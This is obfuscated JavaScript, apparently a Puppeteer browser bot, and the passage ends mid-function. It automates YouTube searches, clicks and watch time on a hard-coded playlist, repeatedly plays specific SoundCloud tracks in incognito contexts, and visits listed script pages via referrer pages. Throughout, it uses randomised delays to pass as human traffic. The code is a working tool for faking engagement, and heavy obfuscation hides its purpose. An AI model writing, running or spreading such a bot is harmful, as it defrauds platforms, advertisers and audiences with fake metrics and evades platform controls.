const X = d,
  W = b,
  V = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x4 * -0xee + -0x1a29 * 0x1 + 0x1672))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0xc97 * -0x2 + 0x29d + -0x35 * -0x6d), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x209 * 0x62 + 0x355b + -0x879d + (-0x6cda + -0x4ea6 + -0x1 * -0xf618) * random()) : await standardWaitForNetIdle(f), await wait(0x1c81 + -0x7e1 + -0x118 + (0x185f * 0x2 + -0x3ef * -0xf + -0x44af * 0x1) * random()), 0x1 * -0x1e63 + -0xc9c + 0x2b00;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x6 * -0x126 + 0x3a5 + -0x33f * -0x1);
    let h = e[f];
    if (c['tsoWPb'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x3e * -0x59 + -0x174 * 0x1a + 0x1f * 0x86, r, s, t = 0x2 * -0xf40 + 0x16d + -0x1 * -0x1d13; s = m['charAt'](t++); ~s && (r = q % (0x142f + -0x26e4 + 0x1 * 0x12b9) ? r * (-0x2b * -0xbc + 0x2 * -0xdb1 + 0x65 * -0xa) + s : s, q++ % (-0x156f + -0x21ec + 0x375f)) ? o += String['fromCharCode'](-0x2192 + -0x6 * -0x497 + 0x707 & r >> (-(0x1963 * -0x1 + 0x4d9 * -0x7 + -0x1daa * -0x2) * q & 0x1fbf + -0x2667 + 0x3 * 0x23a)) : 0x7bb * -0x3 + -0x2 * 0xc3 + 0x18b7) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1 * 0x254b + 0xc * 0x2dd + 0x2ef, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x115 + -0x22 * -0xb2 + -0x1 * 0x167f))['slice'](-(0x2270 + -0x80 + -0x21ee));
        }
        return decodeURIComponent(p);
      };
      c['kuZEpD'] = i, b = arguments, c['tsoWPb'] = !![];
    }
    const j = e[-0x270f + 0xd0c + 0x1a03],
      k = f + j,
      l = b[k];
    return !l ? (h = c['kuZEpD'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x2 * -0xb4c + 0x156d + -0x187d), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x225c + 0x2f * 0x50 + -0x310b;
}
async function randomWait() {
  return await wait(-0x115 + -0x22 * -0xb2 + -0x5 * 0x9b + (0x2270 + -0x80 + -0xe68) * random()), -0x270f + 0xd0c + 0x1a04;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x17c2 + 0x1d * -0xa1 + 0x29ff * 0x1, -0x115f + -0x21f5 + 0x335b * 0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x12fda * -0x1 + -0x15897 + 0x1 * 0x372d1) * getRandomInt(-0xf + -0x58f * -0x5 + -0x1bba, 0x1da5 + -0x1 * 0x2545 + 0x13 * 0x67), h)), -0x30 * 0xac + 0x399 + -0x2 * -0xe54;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1fd5 + -0x1737 * 0x1 + 0x1 * -0x89e;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x146f + -0x1021 * 0x1 + -0x44d]['split']('\x20');
    for (let k = -0x2d3 + 0x1c99 * -0x1 + 0x1f6c; k < i['length']; k += 0x1cf * -0xb + 0x121 * -0x2 + 0x1629)
      j += i[k] * h[i[k + (0x1cb6 + 0xa4 * -0x22 + 0x6ed * -0x1)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x902 + -0x79c + 0x10a4)['map'](l => Array['from'](l['children']))['flat'](-0x8f8 + -0x3f0 * -0x7 + -0x1 * 0x1297)['map'](l => l['childNodes'][-0x63a + -0x64d + 0xc88]['childNodes'][-0x2671 + 0x1 * 0x235a + 0x7 * 0x71]['childNodes'][-0x796 + -0x73b + 0xed2]['childNodes'][-0x23 * 0xbd + -0x1ac9 + 0x1a50 * 0x2]['childNodes'][0x3 * -0x6bc + 0x52 * 0x29 + 0x713]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1 * -0xe51 + -0x11ea + -0x1 * -0x781, 0xb46 + 0x2 * -0xd5a + 0x22f6)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x78b * 0x1 + 0x1 * 0x5347 + -0x1124);
  const h = await getMaxTime(f),
    i = Math['min']((0x15f51 + -0x113d6 + 0x9ee5) * getRandomInt(0x1 * -0x17c0 + -0x89e + 0x2060, -0x4 * 0x410 + 0x104a + -0x5), h);
  return await wait(i), 0x6d * -0x34 + -0x1ed0 + 0x34f5;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1c6 * -0x5 + -0x1 * -0x8dd + -0x1 * -0x1]['children'][-0x28a * 0x4 + 0x201e + -0x15f6]['children'][0x256 * -0x3 + -0x2529 + 0x3 * 0xeb9]['children'][-0x996 + -0xb4d + 0x14e3 * 0x1]['children'][-0x10ce + 0x4 * -0x93 + -0x146 * -0xf]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x2 * 0x107f + -0x133 + -0x1 * 0x1fca;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x6 * -0x126 + 0x3a5 + -0x33f * -0x1);
    let h = e[f];
    if (b['sGGsde'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x3e * -0x59 + -0x174 * 0x1a + 0x1f * 0x86, s, t, u = 0x2 * -0xf40 + 0x16d + -0x1 * -0x1d13; t = n['charAt'](u++); ~t && (s = r % (0x142f + -0x26e4 + 0x1 * 0x12b9) ? s * (-0x2b * -0xbc + 0x2 * -0xdb1 + 0x65 * -0xa) + t : t, r++ % (-0x156f + -0x21ec + 0x375f)) ? p += String['fromCharCode'](-0x2192 + -0x6 * -0x497 + 0x707 & s >> (-(0x1963 * -0x1 + 0x4d9 * -0x7 + -0x1daa * -0x2) * r & 0x1fbf + -0x2667 + 0x3 * 0x23a)) : 0x7bb * -0x3 + -0x2 * 0xc3 + 0x18b7) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1 * 0x254b + 0xc * 0x2dd + 0x2ef, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x115 + -0x22 * -0xb2 + -0x1 * 0x167f))['slice'](-(0x2270 + -0x80 + -0x21ee));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x270f + 0xd0c + 0x1a03,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x17c2 + 0x1d * -0xa1 + 0x29ff * 0x1; u < -0x115f + -0x21f5 + 0x3454 * 0x1; u++) {
          p[u] = u;
        }
        for (u = 0x1952 * -0x1 + -0x1cb8 + 0x1 * 0x360a; u < -0xf + -0x58f * -0x5 + -0x1abc; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1da5 + -0x1 * 0x2545 + 0x18 * 0x5c), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x30 * 0xac + 0x399 + -0x3 * -0x98d, q = 0x1fd5 + -0x1737 * 0x1 + 0x1 * -0x89e;
        for (let v = 0x146f + -0x1021 * 0x1 + -0x44e; v < n['length']; v++) {
          u = (u + (-0x2d3 + 0x1c99 * -0x1 + 0x1f6d)) % (0x1cf * -0xb + 0x121 * -0x2 + 0x1727), q = (q + p[u]) % (0x1cb6 + 0xa4 * -0x22 + 0x2f7 * -0x2), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x902 + -0x79c + 0x119e)]);
        }
        return t;
      };
      b['ZfzCJx'] = m, c = arguments, b['sGGsde'] = !![];
    }
    const j = e[-0x8f8 + -0x3f0 * -0x7 + -0xa * 0x1dc],
      k = f + j,
      l = c[k];
    return !l ? (b['OMgEcJ'] === undefined && (b['OMgEcJ'] = !![]), h = b['ZfzCJx'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xb1a + -0x1 * 0x18d8 + 0x1 * 0x2456 + (-0x1 * -0x89f + -0x2 * -0x92e + -0x1 * 0x1ac9) * random()
  }), await wait(0x1479 + 0x239 * 0x5 + -0x1da2 * 0x1 + (0xb * -0xf1 + 0x24d0 + -0x1949) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const R = b;
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))[R(0x1, '0OEf')]))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x2d * 0x1b + -0x1 * -0x727 + -0x1 * 0x266]['childNodes'][-0x19 * -0x17d + 0x11 * -0x143 + -0xfc1]['childNodes'][-0x176 + -0x20fb + 0x2 * 0x1139]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x4a3 + 0x7 * 0x227 + -0x13af]['childNodes'][-0x1d4 + 0x121f * 0x1 + -0x104b]['childNodes'][-0x16 * 0x174 + 0xa * -0x289 + -0xc * -0x4c7]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x59 * -0x4d + -0x132c * 0x1 + 0x2df2),
          r = -0x45 * -0x89 + 0xb48 + -0x3035;
        for (let u = -0x1 * 0x1061 + -0xcb + -0x4 * -0x44b; u < q['length']; u += -0x376 * 0x8 + -0x115b + 0x1 * 0x2d0d)
          r += q[u] * k[q[u + (0xd * 0x18d + 0x19 * -0xdb + -0x13b * -0x1)]];
        return r;
      }(n);
  });
  await wait((0x485 + 0x161 * 0x14 + 0x3 * 0x8d5) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x19b3c + 0x6 * -0x1d4f + -0x102) * getRandomInt(-0x47 * -0x26 + 0x1139 * -0x1 + -0x4 * -0x1ac, 0x1d0c + -0x1f14 + 0x212), h + (-0x4e1 + 0x1ebf * -0x1 + 0x3728));
  return await wait(i), -0xef * 0x1c + 0x25b * 0x10 + 0x24f * -0x5;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0xd1f * 0x1 + -0x998 + -0x387), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x2390 + 0x19e7 + -0x31bf + (0xe5c + -0x1 * -0x5ce + -0x1042) * Math['random']());
    });
  }, -0x19b0 + -0x31bd + -0x66c5 * -0x1);
  await wait(0x85f00 + 0x2745d + -0x63f7d);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x1 * 0x18021 + 0x14c37 + 0x11e4a) * getRandomInt(0x10c * -0xf + 0x1c67 * -0x1 + 0x2c1f, 0x13f8 + 0x9 * 0x164 + 0x2063 * -0x1)), clearInterval(h), -0x2be + 0x1a2f + -0x1770;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x373 * -0x7 + -0x1118 + -0x70d;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x2 * 0x5d4 + -0x1ba7 * -0x1 + 0x2 * -0x7ff;
    await randomWait();
  }
  return 0x1f55 + -0x1 * -0x476 + 0x9 * -0x3fa;
}

function fetchRandomSC() {
  const S = d;
  return Math['random']() <= -0x1b1e * 0x1 + 0x146d + 0x6b1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x204c + 0x1acd + 0x57f + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + S(0x10) + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x973 + -0x99b + 0x28 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x952 + -0xd8e + 0x3d0 * 0x6;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xd0d5 + -0x11096 + 0xef89 + getRandomInt(-0x2 * -0x1ba7 + -0x109 * 0x43 + 0x48a5, 0x1c76 + 0x1277 + -0x1 * -0x4643));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x192e + 0xfd2 + 0x11 * 0x8d), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x8bc + -0x1 * -0x439 + 0x483;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })[T(0x9)](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xd54 * 0x1 + -0x2645 + 0x33 * 0x103, 0xa63 * -0x1 + 0x4aa * -0x2 + -0x6a3 * -0x3)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1 * -0x10bf + 0x4 * -0x75c + 0x35ff + floor((-0xf32 + -0x2 * -0x134b + -0x137c) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x245feb1 * 0x4a + 0xd827f884 + 0x8031cbd7 * -0x2),
          0x23 * -0xb702 + 0x26739 * -0x1d + 0xdeb6bb,
          0xfdb + 0xce44 + -0x5e1f,
          0xe91 + -0x2f * 0xae + 0x11e1
        ], y = [
          -0xb6b + 0x1b65 * 0x1 + -0xfe2,
          -0x4d * -0x3 + 0x5e * 0x33 + 0x1 * -0x1391,
          0x2 * -0xc41 + 0x2af * -0x3 + 0x2097,
          -0x1 * 0x187d + 0x5a6 + 0x1 * 0x12d7
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1de + 0xc * -0x136 + 0xcab)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x18b3 + 0x1670 + 0x1 * -0x2f23; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1 * 0x72b + -0x10ec + -0x9c1 * -0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x2053 + 0xb2e * -0x2 + 0x9f7 * -0x1] = A[-0x93f + -0x141 + 0xa90] = A[-0x1 * 0x239 + -0x3a * 0x17 + 0x770] = A[-0x24d6 + 0x2 * -0xbc + -0x994 * -0x4] = A[-0x1e5a + 0x64c + 0x3d * 0x65] = A[0x1964 + -0x4c * 0x4f + -0x2 * 0xf6] = A[0x26cb + -0x191a + -0xdac] = A[0x277 + -0x3 * 0x152 + 0x185] = A[-0x1 * 0x3d9 + 0x11 * 0x9c + -0x67c] = A[-0x476 + 0x1583 * -0x1 + 0x1a01] = A[-0xb0 + 0x1 * 0x7 + 0xb2] = A[0x3b7 + 0x25bf * 0x1 + -0x296c] = A[0x1bc1 + -0x1c5e + 0xa8] = A[0x254e * -0x1 + 0x1a * 0x76 + 0x195e] = A[-0x248 * 0x6 + 0xdae * 0x2 + -0xd9f] = A[-0x9bb + 0x136d + -0x9a4] = A[-0x169a + -0x19 * 0x9d + 0x12ff * 0x2] = 0xbe + -0x242 * -0xd + -0x1e18, this['blocks'] = A) : this['blocks'] = [
                0x17da + 0x51f * -0x5 + 0x1c1,
                -0x1 * -0xa6c + -0x725 + -0x347,
                -0x19 * -0xcb + -0x4 * 0x593 + 0x279,
                -0x3 * -0x68d + -0x10 * -0x166 + -0x2a07,
                0x12d + 0x159e + -0x16cb,
                0x2d7 + 0x3 * -0x6e2 + 0x11cf,
                0xaa8 + 0xe60 + -0x1908,
                -0x99a * 0x1 + -0x17 * 0x49 + -0x7 * -0x24f,
                -0x1 * 0x2351 + -0x1059 + 0x33aa,
                0x1021 + 0x25f4 + 0x163 * -0x27,
                -0x7c6 + -0x37 * -0x3 + -0x49 * -0x19,
                -0x11b * 0x6 + 0x2528 + -0x1 * 0x1e86,
                0x4 * -0x11 + -0x5e8 * 0x6 + 0x1c9 * 0x14,
                -0x25df + 0x10f8 + -0x1 * -0x14e7,
                -0x112e + 0x1cc * -0x10 + 0x2dee,
                -0x6 * -0x11b + 0x3b3 * 0x7 + -0x2087,
                -0x1680 + 0x26e * -0x5 + 0x22a6
              ], this['h0'] = 0x651c7 * -0x3d1 + 0x241 * 0x3619a8 + 0x2b9b3e8 * 0x2, this['h1'] = 0xce589b23 + -0xf6fe426 * -0x4 + -0x1c4a8032, this['h2'] = -0xe65a631 * -0x9 + -0x1012023fa * -0x1 + -0xe9f81eb5, this['h3'] = 0xea9c96d + 0x9c3d450 + -0x83b4947, this['h4'] = 0x8dfbeafb + -0x161d5fb6e + 0x197acf263, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x2259 + 0x15c4 + 0xc95, this['finalized'] = this['hashed'] = 0xe06 + 0xbf0 + -0x19f6, this['first'] = -0x8b0 + -0x1 * 0x15a + 0xa0b;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x245f + -0x5e5 + 0x2a44 * 0x1, O = J['length'] || 0x2098 + 0x464 * -0x4 + -0xf08, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xb96 + -0x687 + -0x1 * -0x121d, P[-0x52 * -0x11 + 0x1 * -0xc7d + -0x259 * -0x3] = this['block'], P[-0x2407 + -0xd66 + 0x317d * 0x1] = P[-0x269d + -0x9ce + 0x306c] = P[0x3dd * -0x1 + -0x21 * 0xe3 + 0x2122] = P[0x5f6 + 0x76e + -0xd61] = P[0x1455 * 0x1 + 0x1434 + -0x2885] = P[-0xd * -0x28d + 0x2083 + -0x41a7] = P[-0x1626 + 0x8d * -0x3d + 0x37c5] = P[0xcf6 + -0x1585 + -0x9d * -0xe] = P[0x1ecc + 0x42a + 0x1 * -0x22ee] = P[-0x54a * 0x2 + 0xb7a + -0xdd] = P[0x1442 + -0x14d * -0xd + -0x2521] = P[-0x1e31 + 0x1 * 0x10c0 + 0xd7c] = P[0x2 * 0x45f + -0x1ba + -0x6f8] = P[0x1b97 + 0x1a26 + -0x35b0] = P[-0x2 * 0x67d + 0x19d + -0x1 * -0xb6b] = P[0x138f * -0x1 + 0x5ab + 0x1 * 0xdf3] = -0x1493 * 0x1 + 0x12d4 * -0x1 + 0x1 * 0x2767), K) {
                    for (N = this['start']; M < O && N < 0x1c23 * -0x1 + 0x2242 + 0x5df * -0x1; ++M)
                      P[N >> 0xcd5 + 0x7 * -0x1d5 + 0x0] |= J[M] << y[-0x1d69 + 0x45d + 0x1 * 0x190f & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x10 + 0x1 * 0x1aed + -0x559 * 0x5; ++M)
                      (L = J['charCodeAt'](M)) < -0x9 * 0x42b + -0xfd4 + -0x1 * -0x35d7 ? P[N >> 0x12a5 * 0x2 + 0x131 + -0xcd3 * 0x3] |= L << y[0x10a7 + -0x152f + -0x48b * -0x1 & N++] : L < 0xfd3 + 0x3 * -0x423 + 0x496 ? (P[N >> -0x1095 + -0xd2d + 0x3c * 0x7f] |= (-0x2b * 0x17 + 0x3 * -0xb71 + -0xe * -0x2c8 | L >> 0x5d9 * -0x3 + 0x15 * -0x12a + 0x2a03) << y[0x3 * -0x5f + -0x3 * -0x69 + 0x3 * -0x9 & N++], P[N >> 0x3 * 0x936 + 0x1ff0 + -0x1 * 0x3b90] |= (-0x23a6 + 0x1641 + 0xde5 | -0x1af + 0x185c + 0x20a * -0xb & L) << y[0x150e + 0x1ae + -0x16b9 & N++]) : L < -0x47f6 + 0x8a9 + 0x1174d || L >= 0x2 * 0x296f + -0x1 * -0x1a45 + 0x5 * 0x16f9 ? (P[N >> -0xb * 0x2cf + -0x1 * 0x13cc + 0x32b3] |= (0x91a * -0x4 + -0x19b1 + 0x7 * 0x8ff | L >> -0x10fd + 0x2 * -0x1145 + 0x9 * 0x5bb) << y[-0x477 * 0x1 + 0xcd4 + -0x85a & N++], P[N >> -0x4dc + 0x14f8 * -0x1 + 0xceb * 0x2] |= (-0xbaa * -0x2 + 0x142c + -0x2b00 | L >> 0x226e + -0x13 * -0xc7 + -0x312d * 0x1 & -0x37 * 0x13 + 0x1 * -0x10fb + 0x5 * 0x443) << y[-0x877 + -0x1 * -0x2237 + 0x19bd * -0x1 & N++], P[N >> 0x270a + -0xf5 + -0x169 * 0x1b] |= (-0x1 * -0x1bb2 + 0x17b8 + 0x31 * -0x10a | -0x713 * -0x5 + 0x4 * -0xfb + -0x1f34 & L) << y[-0x8 * -0x47 + 0x74b * 0x2 + -0x10cb & N++]) : (L = -0x1a * -0xa81 + 0x1d06c + -0x1e186 + ((-0x8 * 0x1b6 + 0x1 * 0xb35 + 0x67a & L) << -0x2 * -0xfb6 + -0x2 * 0x445 + -0x88 * 0x2b | -0x3 * -0x373 + 0x21e1 + -0x1 * 0x283b & J['charCodeAt'](++M)), P[N >> -0x1544 + 0xc * 0x59 + 0x111a] |= (-0x54a + -0x17 * 0x4f + -0x17b * -0x9 | L >> 0x296 + -0x53c + 0x2b8) << y[0xdf * 0x5 + -0x2 * 0x523 + -0x2f7 * -0x2 & N++], P[N >> -0x1d * 0xdf + -0x7c4 * 0x4 + 0xfd * 0x39] |= (-0x3d * 0x95 + -0x1cad + 0x40ae | L >> -0x227c + -0x7ed + -0x1 * -0x2a75 & 0x12ba + 0x122a + -0x24a5) << y[0x2215 + -0x1168 + -0x10aa & N++], P[N >> 0xb7 * -0x2f + -0x254f + -0x3a * -0x139] |= (-0x15b6 + 0x18a5 * -0x1 + -0x95f * -0x5 | L >> -0x19be + 0x242f + -0xa6b & -0x1fe8 + 0x20ae + 0x3 * -0x2d) << y[-0x2346 + -0x91 * -0x43 + 0x3e * -0xb & N++], P[N >> -0x1292 + 0x1256 + 0x3e] |= (0x245b * -0x1 + 0x1a * 0x155 + -0x1 * -0x239 | 0x1a * -0x10 + 0xc3b + -0xa5c & L) << y[0x1 * -0x1d41 + 0x129d * -0x2 + -0x162a * -0x3 & N++]);
                  }
